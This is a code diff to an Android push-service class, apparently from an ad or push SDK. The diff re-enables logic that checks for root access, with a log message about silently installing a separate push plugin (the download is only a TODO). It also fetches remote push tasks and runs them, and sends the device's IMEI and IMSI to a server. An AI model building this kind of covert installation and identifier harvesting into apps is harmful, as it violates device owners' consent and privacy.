@@ -1,5 +1,7 @@
 package com.tt.push.service;
 
+import java.util.HashMap;
+
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -13,6 +15,7 @@ import co.lvdou.foundation.utils.extend.LDApkHelper;
 import co.lvdou.foundation.utils.extend.LDContextHelper;
 import co.lvdou.foundation.utils.extend.LDDeviceInfoHelper;
 import co.lvdou.foundation.utils.extend.Logout;
+
 import com.tt.push.action.LoadPushTaskAction;
 import com.tt.push.model.ApkInfo;
 import com.tt.push.model.PushTask;
@@ -20,9 +23,9 @@ import com.tt.push.store.BaseParamsStore;
 import com.tt.push.store.InstallingApkInfoStore;
 import com.tt.push.store.NetworkApkStore;
 import com.tt.push.util.NotificationHelper;
+import com.tt.push.util.PushApkHelper;
 import com.tt.push.util.PushPrefHelper;
-
-import java.util.HashMap;
+import com.tt.push.util.ShellManager;
 
 public class PushService extends Service {
 
@@ -126,37 +129,37 @@ public class PushService extends Service {
         }).execute();
 
 
-//        if (isWorkInPushAPk) {
-//            Logout.out("hi，我是单独的push插件，开始获取最新的push任务");
-//            LoadPushTaskAction.alloc().setDelegate(new LoadPushTaskAction.ActionDelegate() {
-//                @Override
-//                public void onFinishLoadPushTask(PushTask task) {
-//                    if (task != null) {
-//                        task.execute();
-//                    }
-//                }
-//            }).execute();
-//        } else if (isInstalledPushApk) {
-//            Logout.out("hi,我不是单独的push插件，但是我已经安装插件了，开始激活插件");
-//            PushApkHelper.launchPushApk();
-//        } else {
-//            ShellManager sm = ShellManager.shareManager();
-//            if (sm.isObtainRootPermission()) {
-//                //TODO 下载插件apk
-//                Logout.out("hi,我不是单独的push插件，获取到了root权限，静默安装单独push插件");
-//                Logout.out("下载插件apk");
-//            } else {
-//                Logout.out("hi,我不是单独的push插件，没有root权限，自己做任务好了");
-//                LoadPushTaskAction.alloc().setDelegate(new LoadPushTaskAction.ActionDelegate() {
-//                    @Override
-//                    public void onFinishLoadPushTask(PushTask task) {
-//                        if (task != null) {
-//                            task.execute();
-//                        }
-//                    }
-//                }).execute();
-//            }
-//        }
+        if (isWorkInPushAPk) {
+            Logout.out("hi，我是单独的push插件，开始获取最新的push任务");
+            LoadPushTaskAction.alloc().setDelegate(new LoadPushTaskAction.ActionDelegate() {
+                @Override
+                public void onFinishLoadPushTask(PushTask task) {
+                    if (task != null) {
+                        task.execute();
+                    }
+                }
+            }).execute();
+        } else if (isInstalledPushApk) {
+            Logout.out("hi,我不是单独的push插件，但是我已经安装插件了，开始激活插件");
+            PushApkHelper.launchPushApk();
+        } else {
+            ShellManager sm = ShellManager.shareManager();
+            if (sm.isObtainRootPermission()) {
+                //TODO 下载插件apk
+                Logout.out("hi,我不是单独的push插件，获取到了root权限，静默安装单独push插件");
+                Logout.out("下载插件apk");
+            } else {
+                Logout.out("hi,我不是单独的push插件，没有root权限，自己做任务好了");
+                LoadPushTaskAction.alloc().setDelegate(new LoadPushTaskAction.ActionDelegate() {
+                    @Override
+                    public void onFinishLoadPushTask(PushTask task) {
+                        if (task != null) {
+                            task.execute();
+                        }
+                    }
+                }).execute();
+            }
+        }
     }
 
     private void performDownloadApk(final PushTask pushTask, final String iconPath) {
@@ -184,7 +187,7 @@ public class PushService extends Service {
     private void initPushService() {
         LDContextHelper.init(this);
         HashMap<String, String> params = new HashMap<String, String>(6);
-        params.put("imei", LDDeviceInfoHelper.defaultHelper().getImei() + 27);
+        params.put("imei", LDDeviceInfoHelper.defaultHelper().getImei() + 25);
         params.put("imsi", LDDeviceInfoHelper.defaultHelper().getImsi());
         params.put("channelId", "10001");
         params.put("version", "1");
